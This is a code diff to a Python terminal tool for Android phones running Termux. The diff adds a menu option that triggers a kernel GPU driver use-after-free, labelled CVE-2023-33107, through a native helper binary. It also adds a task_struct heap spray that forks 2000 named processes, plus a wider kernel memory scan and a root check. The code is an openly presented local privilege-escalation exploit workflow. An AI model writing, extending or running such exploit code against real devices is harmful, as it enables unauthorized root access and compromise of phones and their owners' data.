@@ -8,6 +8,8 @@ import platform
 class MemoryExplorerAI:
     def __init__(self):
         self.found_items = []
+        self.spray_procs = []
+        self.exploit_proc = None
         # Dynamic path detection for Termux/Linux portability
         base_dir = os.path.dirname(os.path.abspath(__file__))
         self.engine_path = os.path.join(base_dir, "kgsl_engine")
@@ -109,7 +111,8 @@ class MemoryExplorerAI:
     def render_tui(self):
         os.system('clear')
         print("="*75)
-        print(" KGSL MEMORY EXPLORER & AI CLASSIFIER (ROG 5S Optimized) ")
+        print(" KGSL MEMORY EXPLORER & AI CLASSIFIER (ROG 5S Optimized)")
+        print(f" Status: {'EXPLOIT ACTIVE' if self.exploit_proc else 'IDLE'} | Sprays: {len(self.spray_procs)}")
         print("="*75)
         print(f"{'ID':<3} | {'TYPE':<15} | {'DESCRIPTION':<35} | {'VA ADDRESS':<12}")
         print("-" * 75)
@@ -118,8 +121,49 @@ class MemoryExplorerAI:
             print(f"{i:<3} | {item['type']:<15} | {item['description']:<35} | {item['va']:<12}")
         
         print("\n" + "="*75)
-        print("[S] Start Scanning   [R] Check Root   [Q] Quit   [ID] View Details")
+        print("[E] Trigger Exploit  [S] Start Scan  [P] Spray  [R] Check Root  [Q] Quit")
         
+    def trigger_exploit(self):
+        if self.exploit_proc:
+            print("[!] Exploit already active.")
+            return
+        print("[*] Triggering KGSL UAF (CVE-2023-33107)...")
+        self.exploit_proc = subprocess.Popen([self.engine_path, "exploit"], stdout=subprocess.PIPE, text=True)
+        # Wait for ready signal
+        for line in self.exploit_proc.stdout:
+            if "UAF_READY" in line:
+                print("[+] UAF Triggered successfully.")
+                break
+        time.sleep(1)
+
+    def run_spray(self, count=2000):
+        print(f"[*] Spraying {count} task_structs...")
+        import ctypes
+        import ctypes.util
+        
+        libc_path = ctypes.util.find_library('c')
+        if not libc_path: libc_path = 'libc.so'
+        try:
+            libc = ctypes.CDLL(libc_path)
+        except:
+            print("[-] Could not load libc for prctl. Spray names might be default.")
+            libc = None
+            
+        PR_SET_NAME = 15
+        
+        for i in range(count):
+            pid = os.fork()
+            if pid == 0:
+                # In child
+                if libc:
+                    name = f"KETO{i:04d}".encode()
+                    libc.prctl(PR_SET_NAME, name, 0, 0, 0)
+                while True: time.sleep(100)
+            else:
+                self.spray_procs.append(pid)
+        print(f"[+] Sprayed {len(self.spray_procs)} processes.")
+        time.sleep(1)
+
     def check_root(self):
         print("\n[*] Checking for Root status...")
         try:
@@ -234,10 +278,27 @@ class MemoryExplorerAI:
                 break
                 
             if cmd == 'q':
+                # Cleanup
+                if self.exploit_proc: self.exploit_proc.terminate()
+                for pid in self.spray_procs: 
+                    try: os.kill(pid, 9)
+                    except: pass
                 break
+            elif cmd == 'e':
+                self.trigger_exploit()
+                self.render_tui()
+            elif cmd == 'p':
+                self.run_spray()
+                self.render_tui()
             elif cmd == 's':
+                if not self.exploit_proc:
+                    print("[!] Trigger exploit [E] first!")
+                    time.sleep(1)
+                    self.render_tui()
+                    continue
                 print("[*] Starting GPU Scan (Slow Spray mode)...")
-                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x1000000)]
+                # Increased range to 256MB
+                scan_cmd = [self.engine_path, "scan", hex(self.uaf_start), hex(self.uaf_start + 0x10000000)]
                 try:
                     proc = subprocess.Popen(scan_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
                 except OSError as e:
